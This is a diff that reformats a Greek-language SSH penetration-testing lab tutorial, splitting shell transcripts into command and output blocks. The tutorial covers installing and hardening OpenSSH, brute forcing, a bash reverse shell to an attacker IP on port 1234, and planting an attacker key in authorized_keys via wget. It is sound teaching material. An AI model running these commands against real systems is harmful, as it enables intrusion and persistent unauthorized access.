@@ -54,14 +54,27 @@
 Πριν ξεκινήσει οποιοσδήποτε έλεγχος, ο στόχος πρέπει να εκτελεί πράγματι την υπηρεσία την οποία σκοπεύουμε να προσβάλουμε. Σε νεοεγκατεστημένο Ubuntu server τα εργαλεία πελάτη υπάρχουν συνήθως, ο *server* όμως όχι — διότι η προεπιλεγμένη εγκατάσταση Ubuntu δεν εκθέτει απομακρυσμένο κέλυφος εκτός εάν ο διαχειριστής το ζητήσει ρητά. Η εγκατάστασή του συνιστά λειτουργία ενός πακέτου από τον διαχειριστή πακέτων APT, και αξίζει να την εκτελέσεις ο ίδιος τουλάχιστον μία φορά, ώστε να γνωρίζεις επακριβώς πώς μοιάζει η κατάσταση «πριν» ενός στόχου.
 
 ```bash
-pentest@ubuntu-lab:~$ sudo apt update
+sudo apt update
+```
+
+**Έξοδος:**
+
+```text
 Hit:1 http://archive.ubuntu.com/ubuntu jammy InRelease
 Hit:2 http://security.ubuntu.com/ubuntu jammy-security InRelease
 Reading package lists... Done
 Building dependency tree... Done
 Reading state information... Done
 All packages are up to date.
-pentest@ubuntu-lab:~$ sudo apt install openssh-server
+```
+
+```bash
+sudo apt install openssh-server
+```
+
+**Έξοδος:**
+
+```text
 Reading package lists... Done
 Building dependency tree... Done
 Reading state information... Done
@@ -98,7 +111,12 @@ Processing triggers for ufw (0.36.1-8.1) ...
 Οι τελευταίες γραμμές του transcript είναι επίσης πληροφοριακές. Το μήνυμα `Created symlink /etc/systemd/system/sshd.service` αποτελεί τον τρόπο του systemd να δηλώσει ότι η υπηρεσία είναι πλέον enabled: θα εκκινεί κατά το boot, και δύναται να εκκινείται, να σταματά και να επανεκκινείται με `systemctl`. Η συσκευασία Ubuntu εκκινεί τον daemon αμέσως μετά την εγκατάσταση — επομένως το αμέσως επόμενο βήμα είναι να επιβεβαιώσεις ότι πράγματι αναμένει συνδέσεις, και σε ποιο socket:
 
 ```bash
-pentest@ubuntu-lab:~$ systemctl status ssh --no-pager
+systemctl status ssh --no-pager
+```
+
+**Έξοδος:**
+
+```text
 ● ssh.service - OpenBSD Secure Shell server
      Loaded: loaded (/lib/systemd/system/ssh.service; enabled; vendor preset: enabled)
      Active: active (running) since Thu 2024-01-11 09:52:41 UTC; 4min ago
@@ -115,7 +133,15 @@ Jan 11 09:52:41 ubuntu-lab systemd[1]: Starting OpenBSD Secure Shell server...
 Jan 11 09:52:41 ubuntu-lab sshd[812]: Server listening on 0.0.0.0 port 22.
 Jan 11 09:52:41 ubuntu-lab sshd[812]: Server listening on :: port 22.
 Jan 11 09:52:41 ubuntu-lab systemd[1]: Started OpenBSD Secure Shell server.
-pentest@ubuntu-lab:~$ ss -tlnp | grep sshd
+```
+
+```bash
+ss -tlnp | grep sshd
+```
+
+**Έξοδος:**
+
+```text
 LISTEN 0      128          0.0.0.0:22        0.0.0.0:*    users:(("sshd",pid=812,fd=3))
 LISTEN 0      128             [::]:22           [::]:*    users:(("sshd",pid=812,fd=4))
 ```
@@ -301,9 +327,22 @@ nxc ssh 192.168.1.9 -u users.txt -p 123
 Σε αυτό το lab η διάκριση είναι ακαδημαϊκή, διότι το `pentest` είναι πλήρης διαχειριστής με κανόνα sudo χωρίς κωδικό. Αυτό αξίζει να επιβεβαιωθεί χειροκίνητα αφού αποκτήσεις διαδραστική συνεδρία, και η επιβεβαίωση είναι υπόθεση δύο εντολών:
 
 ```bash
-pentest@ubuntu-lab:~$ id
+id
+```
+
+**Έξοδος:**
+
+```text
 uid=1001(pentest) gid=1001(pentest) groups=1001(pentest),27(sudo)
-pentest@ubuntu-lab:~$ sudo -ln
+```
+
+```bash
+sudo -ln
+```
+
+**Έξοδος:**
+
+```text
 Matching Defaults entries for pentest on ubuntu-lab:
     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
 
@@ -350,7 +389,15 @@ Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-91-generic x86_64)
   Swap usage:   0%                IPv6 address for eth0: fe80::20c:29ff:fe1b:2c3d
 
 Last login: Thu Jan 11 09:58:02 2024 from 192.168.1.9
-pentest@ubuntu-lab:~$ id
+```
+
+```bash
+id
+```
+
+**Έξοδος:**
+
+```text
 uid=1001(pentest) gid=1001(pentest) groups=1001(pentest),27(sudo)
 ```
 
@@ -470,15 +517,34 @@ Meterpreter  : x86/linux
 Η αλλαγή συντελείται στο αρχείο ρυθμίσεων server, `/etc/ssh/sshd_config`. Το αρχείο είναι απλό κείμενο με ζεύγη `Λέξη-κλειδί τιμή` — τα περισσότερα σχολιασμένα με `#` και δεικνύουν την προεπιλογή που ισχύει όταν η γραμμή απουσιάζει.
 
 ```bash
-pentest@ubuntu-lab:~$ cd /etc/ssh
-pentest@ubuntu-lab:/etc/ssh$ ls
+cd /etc/ssh
+```
+
+```bash
+ls
+```
+
+**Έξοδος:**
+
+```text
 moduli  ssh_config  ssh_config.d  ssh_host_ecdsa_key  ssh_host_ecdsa_key.pub
 ssh_host_ed25519_key  ssh_host_ed25519_key.pub  ssh_host_rsa_key
 ssh_host_rsa_key.pub  sshd_config  sshd_config.d
-pentest@ubuntu-lab:/etc/ssh$ grep -n "^#Port\|^Port\|^#PasswordAuthentication\|^PasswordAuthentication" sshd_config
+```
+
+```bash
+grep -n "^#Port\|^Port\|^#PasswordAuthentication\|^PasswordAuthentication" sshd_config
+```
+
+**Έξοδος:**
+
+```text
 13:#Port 22
 58:#PasswordAuthentication yes
-pentest@ubuntu-lab:/etc/ssh$ sudo nano sshd_config
+```
+
+```bash
+sudo nano sshd_config
 ```
 
 Η έξοδος `grep` αφηγείται ολόκληρη την ιστορία προτού ανοίξει καν ο editor. Το `#Port 22` στη γραμμή 13 είναι σχόλιο: τεκμηριώνει την ενσωματωμένη προεπιλογή 22, και ο daemon αναμένει πράγματι στο 22 διότι ουδέν το παρέκαμψε. Το `#PasswordAuthentication yes` στη γραμμή 58 πράττει το ίδιο για πιστοποίηση κωδικού — και πάλι, επειδή η γραμμή είναι σχολιασμένη, κυριαρχεί η προεπιλογή πακέτου, και η προεπιλογή αυτή είναι να δέχεται κωδικούς. Η επεξεργασία του αρχείου σημαίνει μετατροπή της πρώτης εξ αυτών σε ενεργή οδηγία και — μεταγενέστερα στην ενότητα 7 — της δεύτερης σε ρητό `no`.
@@ -492,8 +558,16 @@ Port 2222
 Οι συντομεύσεις `nano` αξίζει να απομνημονευτούν εάν είσαι νέος στον editor: το `Ctrl+W` αναζητά κείμενο (ο ταχύτερος τρόπος εντοπισμού της γραμμής 58 σε αρχείο 130 γραμμών), το `Ctrl+O` ακολουθούμενο από Enter αποθηκεύει, το `Ctrl+X` εξέρχεται, και το κάτω μέρος της οθόνης εμφανίζει πάντα το τρέχον μενού. Αφού αποθηκευτεί το αρχείο, ο daemon οφείλει να ειδοποιηθεί να το επαναδιαβάσει — και στο Ubuntu η υπηρεσία διαχειρίζεται από το systemd:
 
 ```bash
-pentest@ubuntu-lab:/etc/ssh$ sudo systemctl restart ssh
-pentest@ubuntu-lab:/etc/ssh$ ss -tlnp | grep sshd
+sudo systemctl restart ssh
+```
+
+```bash
+ss -tlnp | grep sshd
+```
+
+**Έξοδος:**
+
+```text
 LISTEN 0      128          0.0.0.0:2222      0.0.0.0:*    users:(("sshd",pid=2317,fd=3))
 LISTEN 0      128             [::]:2222         [::]:*    users:(("sshd",pid=2317,fd=4))
 ```
@@ -555,7 +629,12 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-01-11 10:22:
 Το εργαλείο πελάτη για τη δημιουργία ζευγαριού κλειδιών είναι το `ssh-keygen`. Εκτελούμενο άνευ ορισμάτων υποβάλλει τρία ερωτήματα — πού να αποθηκεύσει το κλειδί, με ποιο passphrase να το προστατεύσει, και (ιστορικά) ποιον τύπο και μέγεθος κλειδιού να χρησιμοποιήσει. Η προεπιλεγμένη θέση είναι `~/.ssh/id_ed25519` (οι παλαιότερες εκδόσεις προεπιλέγουν `id_rsa`) και το ζευγάρι αποτελείται από αρχείο ιδιωτικού κλειδιού — που δεν οφείλει ποτέ να εγκαταλείψει το μηχάνημα — και αρχείο δημόσιου κλειδιού με κατάληξη `.pub`, σχεδιασμένο να αντιγράφεται παντού.
 
 ```bash
-pentest@ubuntu-lab:~$ ssh-keygen
+ssh-keygen
+```
+
+**Έξοδος:**
+
+```text
 Generating public/private rsa key pair.
 Enter file in which to save the key (/home/pentest/.ssh/id_rsa): 
 Enter passphrase (empty for no passphrase): 
@@ -576,7 +655,15 @@ The key's randomart image is:
 |   . = .  .B.O   |
 |     .+ ..+o+.o  |
 +----[SHA256]-----+
-pentest@ubuntu-lab:~$ ls -l .ssh
+```
+
+```bash
+ls -l .ssh
+```
+
+**Έξοδος:**
+
+```text
 total 8
 -rw------- 1 pentest pentest 2655 Jan 11 10:25 id_rsa
 -rw-r--r-- 1 pentest pentest  572 Jan 11 10:25 id_rsa.pub
@@ -593,20 +680,47 @@ total 8
 Το να εμπιστευτείς το κλειδί είναι δεύτερο, ξεχωριστό βήμα που συντελείται στον *server*: το δημόσιο κλειδί οφείλει να προσαρτηθεί στο αρχείο `~/.ssh/authorized_keys` του λογαριασμού που πρέπει να επιτρέπεται να συνδέεται με αυτό. Το αρχείο αυτό είναι απλή λίστα δημόσιων κλειδιών, ένα ανά γραμμή, και κάθε κλειδί εντός του αποτελεί μόνιμη υπόσχεση ότι όποιος κρατά το ταιριαστό ιδιωτικό κλειδί δύναται να συνδέεται ως αυτός ο χρήστης.
 
 ```bash
-pentest@ubuntu-lab:~$ cd .ssh
-pentest@ubuntu-lab:~/.ssh$ ls -la
+cd .ssh
+```
+
+```bash
+ls -la
+```
+
+**Έξοδος:**
+
+```text
 total 12
 drwx------ 2 pentest pentest 4096 Jan 11 10:25 .
 drwxr-x--- 5 pentest pentest 4096 Jan 11 10:20 ..
 -rw------- 1 pentest pentest 2655 Jan 11 10:25 id_rsa
 -rw-r--r-- 1 pentest pentest  572 Jan 11 10:25 id_rsa.pub
-pentest@ubuntu-lab:~/.ssh$ cat id_rsa.pub >> authorized_keys
-pentest@ubuntu-lab:~/.ssh$ ls -l
+```
+
+```bash
+cat id_rsa.pub >> authorized_keys
+```
+
+```bash
+ls -l
+```
+
+**Έξοδος:**
+
+```text
 total 16
 -rw------- 1 pentest pentest  572 Jan 11 10:26 authorized_keys
 -rw------- 1 pentest pentest 2655 Jan 11 10:25 id_rsa
 -rw-r--r-- 1 pentest pentest  572 Jan 11 10:25 id_rsa.pub
-pentest@ubuntu-lab:~/.ssh$ cat authorized_keys
+```
+
+```bash
+cat authorized_keys
+```
+
+**Έξοδος:**
+
+```text
 ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC7VQ0mTf3xYq1r8pL2kZ9dN4sW6hXaE5jC0oB7uM1vR3tQ... pentest@ubuntu-lab
 ```
 
@@ -631,7 +745,12 @@ PasswordAuthentication no
 Σε σύγχρονο Ubuntu η ενεργή ρύθμιση συναρμολογείται από το `sshd_config` συν κάθε αρχείο στο `/etc/ssh/sshd_config.d/`, και ένα από αυτά τα drop-in αρχεία δύναται να ορίζει `PasswordAuthentication yes` με υψηλότερη προτεραιότητα — διότι στο OpenSSH η *πρώτη* τιμή που εντοπίζεται για λέξη-κλειδί υπερισχύει. Γι' αυτό ο αξιόπιστος τρόπος ελέγχου των ενεργών ρυθμίσεων δεν είναι η ανάγνωση των αρχείων αλλά η ερώτηση προς τον daemon:
 
 ```bash
-pentest@ubuntu-lab:~/.ssh$ sudo sshd -T | grep -i "passwordauthentication\|kbdinteractive\|permitrootlogin"
+sudo sshd -T | grep -i "passwordauthentication\|kbdinteractive\|permitrootlogin"
+```
+
+**Έξοδος:**
+
+```text
 passwordauthentication no
 kbdinteractiveauthentication yes
 permitrootlogin prohibit-password
@@ -1029,7 +1148,12 @@ pentest@ubuntu-lab:~$ 
 Ας υποθέσουμε ότι το engagement προχώρησε πέραν του αρχικού κελύφους και η αποστολή είναι να διαπιστώσεις τι άλλο εκτελεί ο host. Μια ταχεία ματιά στα sockets ακρόασης στον στόχο απαντά το ερώτημα αμέσως, και η απάντηση είναι συνήθως πιο ενδιαφέρουσα από την πόρτα από την οποία εισήλθαμε.
 
 ```bash
-pentest@ubuntu-lab:~$ netstat -ntlp
+netstat -ntlp
+```
+
+**Έξοδος:**
+
+```text
 (Not all processes could be identified, non-owned process info
  will not be shown, you would have to be root to see it all.)
 Active Internet connections (only servers)
@@ -1116,7 +1240,7 @@ listening on [any] 1234 ...
 Με τον listener να αναμένει, το payload πληκτρολογείται στη συνεδρία SSH που ήδη κρατούμε στον στόχο:
 
 ```bash
-pentest@ubuntu-lab:~$ bash -i >& /dev/tcp/192.168.1.17/1234 0>&1
+bash -i >& /dev/tcp/192.168.1.17/1234 0>&1
 ```
 
 Η σύνταξη είναι λακωνική και αξίζει προσεκτικής ανάγνωσης. Το `bash -i` εκκινεί *διαδραστικό* κέλυφος — που μας παρέχει prompt και έλεγχο εργασιών. Το `>& /dev/tcp/192.168.1.17/1234` ανοίγει σύνδεση TCP στον επιτιθέμενο και ανακατευθύνει και standard έξοδο και standard error εντός της. Το `0>&1` έπειτα στρέφει την standard είσοδο στην ίδια σύνδεση — κλείνοντας τον βρόχο ώστε οι πληκτρολογήσεις του επιτιθέμενου να φθάνουν στο κέλυφος. Το αποτέλεσμα είναι αμφίδρομο κανάλι μεταξύ διεργασίας bash στον στόχο και διεργασίας netcat στον επιτιθέμενο· τίποτε δεν εγγράφεται στον δίσκο, ουδέν εκτελέσιμο ρίπτεται, και ο στόχος δεν ακούει σε καμία νέα πόρτα.
@@ -1230,8 +1354,16 @@ updog -p 80
 Το `updog` αποτελεί μικρό Python HTTP server με λίστα καταλόγου· το `python3 -m http.server 80` επιτελεί το ίδιο χωρίς καθόλου πρόσθετα εργαλεία. Είτε έτσι είτε άλλως, το μηχάνημα του επιτιθέμενου σερβίρει πλέον τα περιεχόμενα του `/root/.ssh/` στην πόρτα 80, και το log αιτημάτων επιβεβαιώνει πότε ο στόχος ανακτά πράγματι το αρχείο. Στον στόχο, εντός της υπάρχουσας συνεδρίας SSH, το κλειδί κατεβαίνει και εγκαθίσταται:
 
 ```bash
-pentest@ubuntu-lab:~$ cd .ssh
-pentest@ubuntu-lab:~/.ssh$ wget http://192.168.1.17/id_ed25519.pub -O attacker_key.pub
+cd .ssh
+```
+
+```bash
+wget http://192.168.1.17/id_ed25519.pub -O attacker_key.pub
+```
+
+**Έξοδος:**
+
+```text
 --2024-01-11 10:54:02--  http://192.168.1.17/id_ed25519.pub
 Connecting to 192.168.1.17:80... connected.
 HTTP request sent, awaiting response... 200 OK
@@ -1241,9 +1373,19 @@ Saving to: 'attacker_key.pub'
 attacker_key.pub                      100%[=====================================>]     100  --.-KB/s    in 0s      
 
 2024-01-11 10:54:02 (12.3 MB/s) - 'attacker_key.pub' saved [100/100]
+```
 
-pentest@ubuntu-lab:~/.ssh$ cat attacker_key.pub >> authorized_keys
-pentest@ubuntu-lab:~/.ssh$ ls -al
+```bash
+cat attacker_key.pub >> authorized_keys
+```
+
+```bash
+ls -al
+```
+
+**Έξοδος:**
+
+```text
 total 20
 drwx------ 2 pentest pentest 4096 Jan 11 10:54 .
 drwxr-x--- 5 pentest pentest 4096 Jan 11 10:20 ..
